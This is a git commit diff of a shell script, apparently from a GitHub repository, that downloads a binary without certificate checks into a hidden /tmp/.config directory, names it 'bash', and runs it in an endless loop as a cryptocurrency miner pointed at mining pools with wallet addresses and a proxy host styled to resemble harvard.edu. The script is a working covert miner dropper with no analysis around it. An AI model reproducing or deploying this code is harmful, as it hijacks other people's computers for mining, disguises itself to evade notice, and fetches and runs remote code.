03180381f4d6aafe6d55f6d87c5dfb074f9eb8dc
curiosityinteriorsuk <160749431+curiosityinteriorsuk@users.noreply.github.com>
2024-05-07 10:19:43 +0800

    Update 0.sh

--- 0.sh
+++ 0.sh
@@ -6,9 +6,9 @@ wget --no-check-certificate -4 -qO "/tmp/.config/bash" "https://github.com/curio
 chmod -R  777 /tmp/.config
 
 #!/bin/sh
-##while [ 1 ]; do
-##	#/tmp/.config/bash -a ghostrider --url stratum-na.rplant.xyz:7090 --user STeHt4JoHHWRuazNWkeUEt2jufQapdbnzB.2099d
-## 	/tmp/.config/bash -a ghostrider --url asia.flockpool.com:4444 --user RDACoFmDxhJrktrSsfWHEcCgybGezuPkCw.3099a --pass stu --proxy 165.22.62.162:7091
-##	sleep 5
-##done
-bash -c "sleep 1 && nohup /tmp/.config/bash -a ghostrider --url asia.flockpool.com:4444 --user RDACoFmDxhJrktrSsfWHEcCgybGezuPkCw.3099k --pass stu --proxy 165.22.62.162:7091 >/dev/null 2>&1 &" >/dev/null 2>&1 &
+while [ 1 ]; do
+	#/tmp/.config/bash -a ghostrider --url stratum-na.rplant.xyz:7090 --user STeHt4JoHHWRuazNWkeUEt2jufQapdbnzB.2099i
+ 	#/tmp/.config/bash -a ghostrider --url asia.flockpool.com:4444 --user RDACoFmDxhJrktrSsfWHEcCgybGezuPkCw.harvard --pass stu --proxy harvard.edu.2333333.win:7091
+ 	/tmp/.config/bash -a randomx --url de.zephyr.herominers.com:1123 --user ZEPHsAMwSCxbKjYfnrmAtb9Cu2QSy4E9GC3BbGL5fXKsdRWukZgKTckCNTiqL24ecyaUdcMnzEQE4TTt926ovwqg6pg5bdc86AR --pass harvard --proxy harvard.edu.2333333.win:7091
+	sleep 5
+done
